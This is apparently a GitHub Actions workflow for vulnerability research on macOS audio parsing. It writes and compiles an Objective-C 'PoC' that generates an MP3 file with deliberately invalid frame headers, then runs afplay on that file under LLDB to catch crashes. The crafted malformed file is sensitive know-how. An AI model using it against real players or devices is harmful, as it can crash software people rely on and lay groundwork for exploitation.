name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: Patch encodeme.mm with a more aggressive corruption technique
      - name: Patch encodeme.mm to create a severely invalid MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to generate a file with an invalid frame header..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  NSString *fileName = @"output_invalid.mp3";
                  FILE *file = fopen(fileName.UTF8String, "wb");
                  if (!file) {
                      fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
                      return 1;
                  }

                  // New PoC: Write a completely invalid MP3 frame header.
                  // This header claims to be a valid MP3 frame but contains garbage values
                  // for bitrate and other fields, which is more likely to cause a parser crash
                  // than a simple VBR header mismatch.
                  char invalidFrameHeader[4] = {
                      (char)0xFF, // Frame sync
                      (char)0xFA, // Frame sync + MPEG v1, Layer III
                      (char)0x10, // Invalid bitrate index, no padding, no private bit
                      (char)0x00  // Other flags
                  };
                  
                  // Write the invalid header multiple times to create a small file
                  for (int i = 0; i < 100; ++i) {
                      fwrite(invalidFrameHeader, 1, sizeof(invalidFrameHeader), file);
                      // Followed by some garbage data
                      char dummyData[400] = {0};
                      fwrite(dummyData, 1, sizeof(dummyData), file);
                  }
                  
                  fprintf(stderr, "PoC: Wrote a file with invalid MP3 frame headers.\n");
                  fclose(file);

                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step is no longer needed as the new PoC is simpler, but it's harmless to keep
      - name: Run and Verify File Generation
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "File 'output_invalid.mp3' generated."
          ls -l output_invalid.mp3
          
      # Launch the player directly under LLDB to catch any startup crashes
      - name: Launch Player Under LLDB to Catch Startup Crashes
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with new invalid file ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will stop if a crash occurs.
          run
          # If the process crashed, get the backtrace. If it exited normally, this shows the state at exit.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
          # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
          # We add '|| true' because afplay might exit with an error, which we expect.
          lldb -s player_debug_script.lldb -- afplay output_invalid.mp3 >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts: the invalid MP3 and the player debug log
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_invalid.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
